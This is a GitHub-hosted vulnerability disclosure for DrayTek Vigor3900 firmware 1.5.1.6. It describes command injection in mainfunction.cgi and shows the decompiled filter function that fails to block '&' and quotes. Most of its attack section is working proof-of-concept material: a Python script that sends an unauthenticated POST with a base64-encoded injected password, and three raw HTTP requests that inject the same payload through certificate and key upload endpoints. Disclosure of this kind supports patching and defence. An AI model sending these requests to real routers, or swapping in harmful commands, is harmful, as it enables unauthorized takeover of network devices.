=== Content from github.com_126bac1b_20250111_053943.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fglkfc%2FIoT-Vulnerability%2Fblob%2Fmain%2FDaryTek%2Fvigor3900_4.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fglkfc%2FIoT-Vulnerability%2Fblob%2Fmain%2FDaryTek%2Fvigor3900_4.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=glkfc%2FIoT-Vulnerability)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[glkfc](/glkfc)
/
**[IoT-Vulnerability](/glkfc/IoT-Vulnerability)**
Public

* [Notifications](/login?return_to=%2Fglkfc%2FIoT-Vulnerability) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fglkfc%2FIoT-Vulnerability)
* [Star
   0](/login?return_to=%2Fglkfc%2FIoT-Vulnerability)

* [Code](/glkfc/IoT-Vulnerability)
* [Issues
  0](/glkfc/IoT-Vulnerability/issues)
* [Pull requests
  0](/glkfc/IoT-Vulnerability/pulls)
* [Actions](/glkfc/IoT-Vulnerability/actions)
* [Projects
  0](/glkfc/IoT-Vulnerability/projects)
* [Security](/glkfc/IoT-Vulnerability/security)
* [Insights](/glkfc/IoT-Vulnerability/pulse)

Additional navigation options

* [Code](/glkfc/IoT-Vulnerability)
* [Issues](/glkfc/IoT-Vulnerability/issues)
* [Pull requests](/glkfc/IoT-Vulnerability/pulls)
* [Actions](/glkfc/IoT-Vulnerability/actions)
* [Projects](/glkfc/IoT-Vulnerability/projects)
* [Security](/glkfc/IoT-Vulnerability/security)
* [Insights](/glkfc/IoT-Vulnerability/pulse)

## Files

 main
## Breadcrumbs

1. [IoT-Vulnerability](/glkfc/IoT-Vulnerability/tree/main)
2. /[DaryTek](/glkfc/IoT-Vulnerability/tree/main/DaryTek)
/
# vigor3900\_4.md

Copy path Blame  Blame
## Latest commit

## History

[History](/glkfc/IoT-Vulnerability/commits/main/DaryTek/vigor3900_4.md)284 lines (222 loc) · 8.97 KB main
## Breadcrumbs

1. [IoT-Vulnerability](/glkfc/IoT-Vulnerability/tree/main)
2. /[DaryTek](/glkfc/IoT-Vulnerability/tree/main/DaryTek)
/
# vigor3900\_4.md

Top
## File metadata and controls

* Preview
* Code
* Blame

284 lines (222 loc) · 8.97 KB[Raw](https://github.com/glkfc/IoT-Vulnerability/raw/refs/heads/main/DaryTek/vigor3900_4.md)
# Command injection vulnerability exists in vigor3900

## 1、Basic Information

* Supplier:`DrayTek`
* Product:`vigor3900`
* Firmware version:`1.5.1.6`
* Type:`Command Injection`

## 2、Vulnerability Description

There is a unauthorized command injection vulnerability in the binary file of the `1.5.1.6` firmware version of the `vigor3900` router. The vulnerability is located in the `/www/cgi-bin/mainfunction.cgi` file. The function is `sub_2C920`. Because of this file Improper consideration when filtering the values of relevant fields when processing requests. If the victim has turned on the phone number authentication function and the number is known, the attacker can construct a malicious `HTTP` message without authentication. , thereby executing arbitrary code remotely. The vulnerability point is shown in the figure below.

[![image-20240829133015762](/glkfc/IoT-Vulnerability/raw/main/DaryTek/pic/image-20240829133015762.png)](/glkfc/IoT-Vulnerability/blob/main/DaryTek/pic/image-20240829133015762.png)

As can be seen from the above figure, `v37` is affected by `v38`, and `v37` is passed to the `sub_21F28` function as an explanation, and this function is used to execute shell commands. The code is as follows.

```
const char *__fastcall sub_21F28(const char *a1)
{
  FILE *v1; // r0
  FILE *v2; // r4
  const char *v3; // r5
  const char *v4; // r4

  v1 = popen(a1, "r");
  v2 = v1;
  v3 = (const char *)v1;
  if ( v1 )
  {
    v3 = (const char *)sub_12D78(v1, "CGI: run_command() failed open command stream");
    pclose(v2);
    if ( v3 )
    {
      if ( *v3 )
      {
        v4 = &v3[strlen(v3)];
        if ( isspace(*((unsigned __int8 *)v4 - 1)) )
          *((_BYTE *)v4 - 1) = 0;
      }
    }
  }
  else
  {
    syslog(6, "CGI: run_command() failed open command stream");
  }
  return v3;
}
```

At the same time, the value of `v38` comes from the value of the `formpassword` field, which is decoded by `base64`, the string filter function `filter_string2`, and finally assigned to `v38`, so we can control the value of the `formpassword` field so that Form command injection.

[![image-20240829133123515](/glkfc/IoT-Vulnerability/raw/main/DaryTek/pic/image-20240829133123515.png)](/glkfc/IoT-Vulnerability/blob/main/DaryTek/pic/image-20240829133123515.png)

And for the filter function, the code is as follows. It can be seen that this function does not filter dangerous characters such as `&`, `space`, `''`, etc., so it can form a command injection vulnerability.

```
unsigned __int8 *__fastcall filter_string2(unsigned __int8 *result)
{
  unsigned __int8 *i; // r2
  int v2; // r3
  bool v3; // zf
  _BOOL4 v4; // r3

  for ( i = result; i; ++i )
  {
    v2 = *i;
    v3 = v2 == ';';
    if ( v2 != ';' )
      v3 = v2 == 37;
    if ( v3 || v2 == '`' || v2 == '|' || v2 == '>' || v2 == '\t' || v2 == '\n' || v2 == '\r' )
    {
      *i = 43;
    }
    else
    {
      if ( v2 == '"' )
        goto LABEL_20;
      if ( v2 == '\'' )
      {
        *i = '\'';
        continue;
      }
    }
    v4 = *i == '$';
    if ( i == (unsigned __int8 *)-1 )
      v4 = 0;
    if ( v4 && i[1] == '(' )
    {
      LOBYTE(v2) = '+';
      i[1] = '+';
LABEL_20:
      *i = v2;
    }
    if ( !*i )
      return result;
  }
  return result;
}
```

## 3、Vulnerability Verification

The constructed `POC` is as follows, in which the device needs to enable the phone number authentication function and know the user's phone number.

```
import requests
import base64

def send_post_request(ip, formpassword, phonenumber):
    # Base64 encode the formpassword
    encoded_password = base64.b64encode(formpassword.encode())

    # Define the URL dynamically based on the provided IP
    url = f"http://{ip}/cgi-bin/mainfunction.cgi"

    # Define the payload with the base64 encoded formpassword and phonenumber as a parameter
    payload = {
        "action": "authuser",
        "formusername": "MTIzNDU2",  # This can be modified as needed
        "formpassword": encoded_password,
        "URL": "www.baidu.com",
        "HOST": "10.10.10.1",
        "PHONENUMBER": phonenumber  # Pass the phonenumber parameter
    }

    # Define the headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
        "Content-Type": "text/plain; charset=UTF-8",
        "Accept": "*/*",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
    }

    # Send the POST request
    response = requests.post(url, headers=headers, data=payload)

    # Print the response
    print(response.text)

# Example usage
send_post_request("10.10.10.2", "' & mkdir a & '", "12345678")
```

The running results are as follows. You can see that the `a` folder is created under the `www/cgi-bin` folder.

## 4. Post-authorization command injection vulnerability

### (1) The first place

There is a post-authorization command injection vulnerability in the binary file of the `1.5.1.6` firmware version of the `vigor3900` router. The vulnerability is located in the `/www/cgi-bin/mainfunction.cgi` file and the function is `sub_11DC8`.

[![image-20240829133256704](/glkfc/IoT-Vulnerability/raw/main/DaryTek/pic/image-20240829133256704.png)](/glkfc/IoT-Vulnerability/blob/main/DaryTek/pic/image-20240829133256704.png)

`poc` is as follows

```
POST /cgi-bin/mainfunction.cgi/certificaterequestupload HTTP/1.1
Host: 10.10.10.2
Content-Length: 420
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.2
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydnD4qnkyAGAMoKSW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.2/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: SESSION_ID_VIGOR=7:AD9449AD522C076533749160C5360255; lang=zh-cn
Connection: close

------WebKitFormBoundarydnD4qnkyAGAMoKSW
Content-Disposition: form-data; name="select"

remote
------WebKitFormBoundarydnD4qnkyAGAMoKSW
Content-Disposition: form-data; name="password"

' & mkdir a & '
------WebKitFormBoundarydnD4qnkyAGAMoKSW
Content-Disposition: form-data; name="selectfile"; filename="a.all"
Content-Type: application/octet-stream

11111111111

------WebKitFormBoundarydnD4qnkyAGAMoKSW--

```

The experimental results are as follows

[![image-20240829133324512](/glkfc/IoT-Vulnerability/raw/main/DaryTek/pic/image-20240829133324512.png)](/glkfc/IoT-Vulnerability/blob/main/DaryTek/pic/image-20240829133324512.png)

### (2) The second place

There is a post-authorization command injection vulnerability in the binary file of the `1.5.1.6` firmware version of the `vigor3900` router. The vulnerability is located in the `/www/cgi-bin/mainfunction.cgi` file and the function is `sub_11F38`.

[![image-20240829133346527](/glkfc/IoT-Vulnerability/raw/main/DaryTek/pic/image-20240829133346527.png)](/glkfc/IoT-Vulnerability/blob/main/DaryTek/pic/image-20240829133346527.png)

`poc` is as follows

```
POST /cgi-bin/mainfunction.cgi/userkeyupload HTTP/1.1
Host: 10.10.10.2
Content-Length: 420
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.2
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydnD4qnkyAGAMoKSW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.2/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: SESSION_ID_VIGOR=7:AD9449AD522C076533749160C5360255; lang=zh-cn
Connection: close

------WebKitFormBoundarydnD4qnkyAGAMoKSW
Content-Disposition: form-data; name="certType"

trustca
------WebKitFormBoundarydnD4qnkyAGAMoKSW
Content-Disposition: form-data; name="keyPassphrase"

' & mkdir a & '
------WebKitFormBoundarydnD4qnkyAGAMoKSW
Content-Disposition: form-data; name="selectfile"; filename="a.all"
Content-Type: application/octet-stream

11111111111

------WebKitFormBoundarydnD4qnkyAGAMoKSW--

```

or

```
POST /cgi-bin/mainfunction.cgi/userkeyupload HTTP/1.1
Host: 10.10.10.2
Content-Length: 420
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.2
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydnD4qnkyAGAMoKSW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.2/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: SESSION_ID_VIGOR=7:AD9449AD522C076533749160C5360255; lang=zh-cn
Connection: close

------WebKitFormBoundarydnD4qnkyAGAMoKSW
Content-Disposition: form-data; name="certType"

usercertificate
------WebKitFormBoundarydnD4qnkyAGAMoKSW
Content-Disposition: form-data; name="keyPassphrase"

' & mkdir a & '
------WebKitFormBoundarydnD4qnkyAGAMoKSW
Content-Disposition: form-data; name="selectfile"; filename="a.all"
Content-Type: application/octet-stream

11111111111

------WebKitFormBoundarydnD4qnkyAGAMoKSW--

```

The effect is as follows

[![image-20240829133421578](/glkfc/IoT-Vulnerability/raw/main/DaryTek/pic/image-20240829133421578.png)](/glkfc/IoT-Vulnerability/blob/main/DaryTek/pic/image-20240829133421578.png)

## 5、Reporter

* #### ✨jfkk (jfkk2331997024@gmail.com)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


